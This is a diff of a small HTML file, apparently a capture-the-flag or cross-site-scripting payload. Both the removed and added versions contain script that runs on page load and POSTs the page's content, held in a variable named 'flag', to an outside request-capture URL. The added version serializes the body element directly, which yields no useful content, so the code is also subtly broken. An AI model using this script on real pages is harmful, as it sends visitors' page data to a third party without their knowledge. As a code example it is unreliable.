@@ -1,14 +1,16 @@
+<!DOCTYPE html>
 <html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Example HTML File</title>
+  </head>
   <body>
-    <embed onload="sendData()"></embed>
     <script>
-      function sendData() {
-        let flag = document.body.innerHTML;
-        let xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://alexyqiu.free.beeceptor.com');
-        xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
-        xhr.send(JSON.stringify(flag));
-      }
+      let flag = document.body;
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://alexyqiu.free.beeceptor.com', true);
+      xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+      xhr.send(JSON.stringify(flag));
     </script>
   </body>
 </html>
